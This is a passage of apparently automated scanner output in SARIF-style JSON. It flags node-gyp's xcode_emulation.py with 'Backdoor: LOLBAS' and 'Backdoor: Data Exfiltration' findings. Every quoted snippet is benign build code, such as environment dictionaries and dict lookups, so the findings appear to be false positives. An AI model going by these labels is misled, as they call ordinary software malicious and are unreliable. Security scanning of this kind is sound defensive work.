                      "markdown": "`def ExpandEnvVars(string, expansions):\n    \"\"\"Expands ${VARIABLES}, $(VARIABLES), and $VARIABLES in string per the\n  expansions list. If the variable expands to something that references\n  another variable, this variable is expanded as well if it's in env --\n  until no variables present in env are left.\"\"\"\n    for k, v in reversed(expansions):\n        string = string.replace(\"${\" + k + \"}\", v)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1738,
                  "startColumn": 66,
                  "endLine": 1738,
                  "endColumn": 71,
                  "snippet": {
                    "text": "        # /Developer/Platforms/MacOSX.platform/Developer/Library/Xcode/Specifications/MacOSX\\ Product\\ Types.xcspec  # noqa: E501\n        \"SRCROOT\": srcroot,\n        \"SOURCE_ROOT\": \"${SRCROOT}\",\n        # This is not true for static libraries, but currently the env is only\n        # written for bundles:\n        \"TARGET_BUILD_DIR\": built_products_dir,\n        \"TEMP_DIR\": \"${TMPDIR}\",\n",
                    "rendered": {
                      "text": "        # /Developer/Platforms/MacOSX.platform/Developer/Library/Xcode/Specifications/MacOSX\\ Product\\ Types.xcspec  # noqa: E501\n        \"SRCROOT\": srcroot,\n        \"SOURCE_ROOT\": \"${SRCROOT}\",\n        # This is not true for static libraries, but currently the env is only\n        # written for bundles:\n        \"TARGET_BUILD_DIR\": built_products_dir,\n        \"TEMP_DIR\": \"${TMPDIR}\",\n",
                      "markdown": "`        # /Developer/Platforms/MacOSX.platform/Developer/Library/Xcode/Specifications/MacOSX\\ Product\\ Types.xcspec  # noqa: E501\n        \"SRCROOT\": srcroot,\n        \"SOURCE_ROOT\": \"${SRCROOT}\",\n        # This is not true for static libraries, but currently the env is only\n        # written for bundles:\n        \"TARGET_BUILD_DIR\": built_products_dir,\n        \"TEMP_DIR\": \"${TMPDIR}\",\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1729,
                  "startColumn": 3,
                  "endLine": 1729,
                  "endColumn": 8,
                  "snippet": {
                    "text": "    spec = xcode_settings.spec\n\n    # These are filled in on an as-needed basis.\n    env = {\n        \"BUILT_FRAMEWORKS_DIR\": built_products_dir,\n        \"BUILT_PRODUCTS_DIR\": built_products_dir,\n        \"CONFIGURATION\": configuration,\n",
                    "rendered": {
                      "text": "    spec = xcode_settings.spec\n\n    # These are filled in on an as-needed basis.\n    env = {\n        \"BUILT_FRAMEWORKS_DIR\": built_products_dir,\n        \"BUILT_PRODUCTS_DIR\": built_products_dir,\n        \"CONFIGURATION\": configuration,\n",
                      "markdown": "`    spec = xcode_settings.spec\n\n    # These are filled in on an as-needed basis.\n    env = {\n        \"BUILT_FRAMEWORKS_DIR\": built_products_dir,\n        \"BUILT_PRODUCTS_DIR\": built_products_dir,\n        \"CONFIGURATION\": configuration,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1659,
                  "startColumn": 28,
                  "endLine": 1659,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    build directory,\n  * |defines| is a list of preprocessor defines (empty if the plist\n    shouldn't be preprocessed,\n  * |extra_env| is a dict of env variables that should be exported when\n    invoking |mac_tool copy-info-plist|.\n\n  Only call this for mac bundle targets.\n",
                    "rendered": {
                      "text": "    build directory,\n  * |defines| is a list of preprocessor defines (empty if the plist\n    shouldn't be preprocessed,\n  * |extra_env| is a dict of env variables that should be exported when\n    invoking |mac_tool copy-info-plist|.\n\n  Only call this for mac bundle targets.\n",
                      "markdown": "`    build directory,\n  * |defines| is a list of preprocessor defines (empty if the plist\n    shouldn't be preprocessed,\n  * |extra_env| is a dict of env variables that should be exported when\n    invoking |mac_tool copy-info-plist|.\n\n  Only call this for mac bundle targets.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 97,
                  "startColumn": 55,
                  "endLine": 97,
                  "endColumn": 63,
                  "snippet": {
                    "text": "\n\ndef GetXcodeArchsDefault():\n    \"\"\"Returns the |XcodeArchsDefault| object to use to expand ARCHS for the\n  installed version of Xcode. The default values used by Xcode for ARCHS\n  and the expansion of the variables depends on the version of Xcode used.\n\n",
                    "rendered": {
                      "text": "\n\ndef GetXcodeArchsDefault():\n    \"\"\"Returns the |XcodeArchsDefault| object to use to expand ARCHS for the\n  installed version of Xcode. The default values used by Xcode for ARCHS\n  and the expansion of the variables depends on the version of Xcode used.\n\n",
                      "markdown": "`\n\ndef GetXcodeArchsDefault():\n    \"\"\"Returns the |XcodeArchsDefault| object to use to expand ARCHS for the\n  installed version of Xcode. The default values used by Xcode for ARCHS\n  and the expansion of the variables depends on the version of Xcode used.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 72,
                  "endLine": 6,
                  "endColumn": 77,
                  "snippet": {
                    "text": "# found in the LICENSE file.\n\n\"\"\"\nThis module contains classes that help to emulate xcodebuild behavior on top of\nother build systems, such as make and ninja.\n\"\"\"\n\n",
                    "rendered": {
                      "text": "# found in the LICENSE file.\n\n\"\"\"\nThis module contains classes that help to emulate xcodebuild behavior on top of\nother build systems, such as make and ninja.\n\"\"\"\n\n",
                      "markdown": "`# found in the LICENSE file.\n\n\"\"\"\nThis module contains classes that help to emulate xcodebuild behavior on top of\nother build systems, such as make and ninja.\n\"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1912,
                  "startColumn": 47,
                  "endLine": 1912,
                  "endColumn": 52,
                  "snippet": {
                    "text": "  IPHONEOS_DEPLOYMENT_TARGET.\"\"\"\n    for target_dict in targets.values():\n        for config in target_dict[\"configurations\"].values():\n            if config.get(\"xcode_settings\", {}).get(\"IPHONEOS_DEPLOYMENT_TARGET\"):\n                return True\n    return False\n\n",
                    "rendered": {
                      "text": "  IPHONEOS_DEPLOYMENT_TARGET.\"\"\"\n    for target_dict in targets.values():\n        for config in target_dict[\"configurations\"].values():\n            if config.get(\"xcode_settings\", {}).get(\"IPHONEOS_DEPLOYMENT_TARGET\"):\n                return True\n    return False\n\n",
                      "markdown": "`  IPHONEOS_DEPLOYMENT_TARGET.\"\"\"\n    for target_dict in targets.values():\n        for config in target_dict[\"configurations\"].values():\n            if config.get(\"xcode_settings\", {}).get(\"IPHONEOS_DEPLOYMENT_TARGET\"):\n                return True\n    return False\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1912,
                  "startColumn": 21,
                  "endLine": 1912,
                  "endColumn": 26,
                  "snippet": {
                    "text": "  IPHONEOS_DEPLOYMENT_TARGET.\"\"\"\n    for target_dict in targets.values():\n        for config in target_dict[\"configurations\"].values():\n            if config.get(\"xcode_settings\", {}).get(\"IPHONEOS_DEPLOYMENT_TARGET\"):\n                return True\n    return False\n\n",
                    "rendered": {
                      "text": "  IPHONEOS_DEPLOYMENT_TARGET.\"\"\"\n    for target_dict in targets.values():\n        for config in target_dict[\"configurations\"].values():\n            if config.get(\"xcode_settings\", {}).get(\"IPHONEOS_DEPLOYMENT_TARGET\"):\n                return True\n    return False\n\n",
                      "markdown": "`  IPHONEOS_DEPLOYMENT_TARGET.\"\"\"\n    for target_dict in targets.values():\n        for config in target_dict[\"configurations\"].values():\n            if config.get(\"xcode_settings\", {}).get(\"IPHONEOS_DEPLOYMENT_TARGET\"):\n                return True\n    return False\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1897,
                  "startColumn": 25,
                  "endLine": 1897,
                  "endColumn": 30,
                  "snippet": {
                    "text": "    \"\"\"Returns the list of postbuilds explicitly defined on |spec|, in a form\n  executable by a shell.\"\"\"\n    postbuilds = []\n    for postbuild in spec.get(\"postbuilds\", []):\n        if not quiet:\n            postbuilds.append(\n                \"echo POSTBUILD\\\\(%s\\\\) %s\"\n",
                    "rendered": {
                      "text": "    \"\"\"Returns the list of postbuilds explicitly defined on |spec|, in a form\n  executable by a shell.\"\"\"\n    postbuilds = []\n    for postbuild in spec.get(\"postbuilds\", []):\n        if not quiet:\n            postbuilds.append(\n                \"echo POSTBUILD\\\\(%s\\\\) %s\"\n",
                      "markdown": "`    \"\"\"Returns the list of postbuilds explicitly defined on |spec|, in a form\n  executable by a shell.\"\"\"\n    postbuilds = []\n    for postbuild in spec.get(\"postbuilds\", []):\n        if not quiet:\n            postbuilds.append(\n                \"echo POSTBUILD\\\\(%s\\\\) %s\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1796,
                  "startColumn": 42,
                  "endLine": 1796,
                  "endColumn": 47,
                  "snippet": {
                    "text": "    if install_name_base:\n        env[\"DYLIB_INSTALL_NAME_BASE\"] = install_name_base\n    xcode_version, _ = XcodeVersion()\n    if xcode_version >= \"0500\" and not env.get(\"SDKROOT\"):\n        sdk_root = xcode_settings._SdkRoot(configuration)\n        if not sdk_root:\n            sdk_root = xcode_settings._XcodeSdkPath(\"\")\n",
                    "rendered": {
                      "text": "    if install_name_base:\n        env[\"DYLIB_INSTALL_NAME_BASE\"] = install_name_base\n    xcode_version, _ = XcodeVersion()\n    if xcode_version >= \"0500\" and not env.get(\"SDKROOT\"):\n        sdk_root = xcode_settings._SdkRoot(configuration)\n        if not sdk_root:\n            sdk_root = xcode_settings._XcodeSdkPath(\"\")\n",
                      "markdown": "`    if install_name_base:\n        env[\"DYLIB_INSTALL_NAME_BASE\"] = install_name_base\n    xcode_version, _ = XcodeVersion()\n    if xcode_version >= \"0500\" and not env.get(\"SDKROOT\"):\n        sdk_root = xcode_settings._SdkRoot(configuration)\n        if not sdk_root:\n            sdk_root = xcode_settings._XcodeSdkPath(\"\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1602,
                  "startColumn": 20,
                  "endLine": 1602,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    is_mac_bundle = (\n        int(spec.get(\"mac_xctest_bundle\", 0)) != 0\n        or int(spec.get(\"mac_xcuitest_bundle\", 0)) != 0\n        or (int(spec.get(\"mac_bundle\", 0)) != 0 and flavor == \"mac\")\n    )\n\n    if is_mac_bundle:\n",
                    "rendered": {
                      "text": "    is_mac_bundle = (\n        int(spec.get(\"mac_xctest_bundle\", 0)) != 0\n        or int(spec.get(\"mac_xcuitest_bundle\", 0)) != 0\n        or (int(spec.get(\"mac_bundle\", 0)) != 0 and flavor == \"mac\")\n    )\n\n    if is_mac_bundle:\n",
                      "markdown": "`    is_mac_bundle = (\n        int(spec.get(\"mac_xctest_bundle\", 0)) != 0\n        or int(spec.get(\"mac_xcuitest_bundle\", 0)) != 0\n        or (int(spec.get(\"mac_bundle\", 0)) != 0 and flavor == \"mac\")\n    )\n\n    if is_mac_bundle:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1601,
                  "startColumn": 19,
                  "endLine": 1601,
                  "endColumn": 24,
                  "snippet": {
                    "text": "  resources into that directory.\"\"\"\n    is_mac_bundle = (\n        int(spec.get(\"mac_xctest_bundle\", 0)) != 0\n        or int(spec.get(\"mac_xcuitest_bundle\", 0)) != 0\n        or (int(spec.get(\"mac_bundle\", 0)) != 0 and flavor == \"mac\")\n    )\n\n",
                    "rendered": {
                      "text": "  resources into that directory.\"\"\"\n    is_mac_bundle = (\n        int(spec.get(\"mac_xctest_bundle\", 0)) != 0\n        or int(spec.get(\"mac_xcuitest_bundle\", 0)) != 0\n        or (int(spec.get(\"mac_bundle\", 0)) != 0 and flavor == \"mac\")\n    )\n\n",
                      "markdown": "`  resources into that directory.\"\"\"\n    is_mac_bundle = (\n        int(spec.get(\"mac_xctest_bundle\", 0)) != 0\n        or int(spec.get(\"mac_xcuitest_bundle\", 0)) != 0\n        or (int(spec.get(\"mac_bundle\", 0)) != 0 and flavor == \"mac\")\n    )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1600,
                  "startColumn": 16,
                  "endLine": 1600,
                  "endColumn": 21,
                  "snippet": {
                    "text": "  just a single file. Bundle rules do not produce a binary but also package\n  resources into that directory.\"\"\"\n    is_mac_bundle = (\n        int(spec.get(\"mac_xctest_bundle\", 0)) != 0\n        or int(spec.get(\"mac_xcuitest_bundle\", 0)) != 0\n        or (int(spec.get(\"mac_bundle\", 0)) != 0 and flavor == \"mac\")\n    )\n",
                    "rendered": {
                      "text": "  just a single file. Bundle rules do not produce a binary but also package\n  resources into that directory.\"\"\"\n    is_mac_bundle = (\n        int(spec.get(\"mac_xctest_bundle\", 0)) != 0\n        or int(spec.get(\"mac_xcuitest_bundle\", 0)) != 0\n        or (int(spec.get(\"mac_bundle\", 0)) != 0 and flavor == \"mac\")\n    )\n",
                      "markdown": "`  just a single file. Bundle rules do not produce a binary but also package\n  resources into that directory.\"\"\"\n    is_mac_bundle = (\n        int(spec.get(\"mac_xctest_bundle\", 0)) != 0\n        or int(spec.get(\"mac_xcuitest_bundle\", 0)) != 0\n        or (int(spec.get(\"mac_bundle\", 0)) != 0 and flavor == \"mac\")\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1585,
                  "startColumn": 39,
                  "endLine": 1585,
                  "endColumn": 44,
                  "snippet": {
                    "text": "    # The xcode generator special-cases global xcode_settings and does something\n    # that amounts to merging in the global xcode_settings into each local\n    # xcode_settings dict.\n    global_xcode_settings = global_dict.get(\"xcode_settings\", {})\n    for config in spec[\"configurations\"].values():\n        if \"xcode_settings\" in config:\n            new_settings = global_xcode_settings.copy()\n",
                    "rendered": {
                      "text": "    # The xcode generator special-cases global xcode_settings and does something\n    # that amounts to merging in the global xcode_settings into each local\n    # xcode_settings dict.\n    global_xcode_settings = global_dict.get(\"xcode_settings\", {})\n    for config in spec[\"configurations\"].values():\n        if \"xcode_settings\" in config:\n            new_settings = global_xcode_settings.copy()\n",
                      "markdown": "`    # The xcode generator special-cases global xcode_settings and does something\n    # that amounts to merging in the global xcode_settings into each local\n    # xcode_settings dict.\n    global_xcode_settings = global_dict.get(\"xcode_settings\", {})\n    for config in spec[\"configurations\"].values():\n        if \"xcode_settings\" in config:\n            new_settings = global_xcode_settings.copy()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1466,
                  "startColumn": 13,
                  "endLine": 1466,
                  "endColumn": 18,
                  "snippet": {
                    "text": "                \".cxx\": \"cc\",\n                \".m\": \"m\",\n                \".mm\": \"mm\",\n            }.get(ext, None)\n            if lang:\n                result.append((source, obj, self._Gch(lang, arch)))\n        return result\n",
                    "rendered": {
                      "text": "                \".cxx\": \"cc\",\n                \".m\": \"m\",\n                \".mm\": \"mm\",\n            }.get(ext, None)\n            if lang:\n                result.append((source, obj, self._Gch(lang, arch)))\n        return result\n",
                      "markdown": "`                \".cxx\": \"cc\",\n                \".m\": \"m\",\n                \".mm\": \"mm\",\n            }.get(ext, None)\n            if lang:\n                result.append((source, obj, self._Gch(lang, arch)))\n        return result\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1352,
                  "startColumn": 56,
                  "endLine": 1352,
                  "endColumn": 61,
                  "snippet": {
                    "text": "        if xcode_version < \"0500\":\n            return \"\"\n        default_sdk_path = self._XcodeSdkPath(\"\")\n        default_sdk_root = XcodeSettings._sdk_root_cache.get(default_sdk_path)\n        if default_sdk_root:\n            return default_sdk_root\n        try:\n",
                    "rendered": {
                      "text": "        if xcode_version < \"0500\":\n            return \"\"\n        default_sdk_path = self._XcodeSdkPath(\"\")\n        default_sdk_root = XcodeSettings._sdk_root_cache.get(default_sdk_path)\n        if default_sdk_root:\n            return default_sdk_root\n        try:\n",
                      "markdown": "`        if xcode_version < \"0500\":\n            return \"\"\n        default_sdk_path = self._XcodeSdkPath(\"\")\n        default_sdk_root = XcodeSettings._sdk_root_cache.get(default_sdk_path)\n        if default_sdk_root:\n            return default_sdk_root\n        try:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1318,
                  "startColumn": 75,
                  "endLine": 1318,
                  "endColumn": 80,
                  "snippet": {
                    "text": "                cache[\"DTSDKBuild\"] = cache[\"BuildMachineOSBuild\"]\n\n            if self.isIOS:\n                cache[\"MinimumOSVersion\"] = self.xcode_settings[configname].get(\n                    \"IPHONEOS_DEPLOYMENT_TARGET\"\n                )\n                cache[\"DTPlatformName\"] = sdk_root\n",
                    "rendered": {
                      "text": "                cache[\"DTSDKBuild\"] = cache[\"BuildMachineOSBuild\"]\n\n            if self.isIOS:\n                cache[\"MinimumOSVersion\"] = self.xcode_settings[configname].get(\n                    \"IPHONEOS_DEPLOYMENT_TARGET\"\n                )\n                cache[\"DTPlatformName\"] = sdk_root\n",
                      "markdown": "`                cache[\"DTSDKBuild\"] = cache[\"BuildMachineOSBuild\"]\n\n            if self.isIOS:\n                cache[\"MinimumOSVersion\"] = self.xcode_settings[configname].get(\n                    \"IPHONEOS_DEPLOYMENT_TARGET\"\n                )\n                cache[\"DTPlatformName\"] = sdk_root\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1299,
                  "startColumn": 54,
                  "endLine": 1299,
                  "endColumn": 59,
                  "snippet": {
                    "text": "            xcode_version, xcode_build = XcodeVersion()\n            cache[\"DTXcode\"] = xcode_version\n            cache[\"DTXcodeBuild\"] = xcode_build\n            compiler = self.xcode_settings[configname].get(\"GCC_VERSION\")\n            if compiler is not None:\n                cache[\"DTCompiler\"] = compiler\n\n",
                    "rendered": {
                      "text": "            xcode_version, xcode_build = XcodeVersion()\n            cache[\"DTXcode\"] = xcode_version\n            cache[\"DTXcodeBuild\"] = xcode_build\n            compiler = self.xcode_settings[configname].get(\"GCC_VERSION\")\n            if compiler is not None:\n                cache[\"DTCompiler\"] = compiler\n\n",
                      "markdown": "`            xcode_version, xcode_build = XcodeVersion()\n            cache[\"DTXcode\"] = xcode_version\n            cache[\"DTXcodeBuild\"] = xcode_build\n            compiler = self.xcode_settings[configname].get(\"GCC_VERSION\")\n            if compiler is not None:\n                cache[\"DTCompiler\"] = compiler\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1287,
                  "startColumn": 48,
                  "endLine": 1287,
                  "endColumn": 53,
                  "snippet": {
                    "text": "        return GetStdout([\"sw_vers\", \"-buildVersion\"])\n\n    def _XcodeIOSDeviceFamily(self, configname):\n        family = self.xcode_settings[configname].get(\"TARGETED_DEVICE_FAMILY\", \"1\")\n        return [int(x) for x in family.split(\",\")]\n\n    def GetExtraPlistItems(self, configname=None):\n",
                    "rendered": {
                      "text": "        return GetStdout([\"sw_vers\", \"-buildVersion\"])\n\n    def _XcodeIOSDeviceFamily(self, configname):\n        family = self.xcode_settings[configname].get(\"TARGETED_DEVICE_FAMILY\", \"1\")\n        return [int(x) for x in family.split(\",\")]\n\n    def GetExtraPlistItems(self, configname=None):\n",
                      "markdown": "`        return GetStdout([\"sw_vers\", \"-buildVersion\"])\n\n    def _XcodeIOSDeviceFamily(self, configname):\n        family = self.xcode_settings[configname].get(\"TARGETED_DEVICE_FAMILY\", \"1\")\n        return [int(x) for x in family.split(\",\")]\n\n    def GetExtraPlistItems(self, configname=None):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1236,
                  "startColumn": 51,
                  "endLine": 1236,
                  "endColumn": 56,
                  "snippet": {
                    "text": "                        \"Multiple codesigning fingerprints for identity: %s\" % identity\n                    )\n                    XcodeSettings._codesigning_key_cache[identity] = fingerprint\n        return XcodeSettings._codesigning_key_cache.get(identity, \"\")\n\n    def AddImplicitPostbuilds(\n        self, configname, output, output_binary, postbuilds=[], quiet=False\n",
                    "rendered": {
                      "text": "                        \"Multiple codesigning fingerprints for identity: %s\" % identity\n                    )\n                    XcodeSettings._codesigning_key_cache[identity] = fingerprint\n        return XcodeSettings._codesigning_key_cache.get(identity, \"\")\n\n    def AddImplicitPostbuilds(\n        self, configname, output, output_binary, postbuilds=[], quiet=False\n",
                      "markdown": "`                        \"Multiple codesigning fingerprints for identity: %s\" % identity\n                    )\n                    XcodeSettings._codesigning_key_cache[identity] = fingerprint\n        return XcodeSettings._codesigning_key_cache.get(identity, \"\")\n\n    def AddImplicitPostbuilds(\n        self, configname, output, output_binary, postbuilds=[], quiet=False\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1221,
                  "startColumn": 27,
                  "endLine": 1221,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        return postbuilds\n\n    def _GetIOSCodeSignIdentityKey(self, settings):\n        identity = settings.get(\"CODE_SIGN_IDENTITY\")\n        if not identity:\n            return None\n        if identity not in XcodeSettings._codesigning_key_cache:\n",
                    "rendered": {
                      "text": "        return postbuilds\n\n    def _GetIOSCodeSignIdentityKey(self, settings):\n        identity = settings.get(\"CODE_SIGN_IDENTITY\")\n        if not identity:\n            return None\n        if identity not in XcodeSettings._codesigning_key_cache:\n",
                      "markdown": "`        return postbuilds\n\n    def _GetIOSCodeSignIdentityKey(self, settings):\n        identity = settings.get(\"CODE_SIGN_IDENTITY\")\n        if not identity:\n            return None\n        if identity not in XcodeSettings._codesigning_key_cache:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
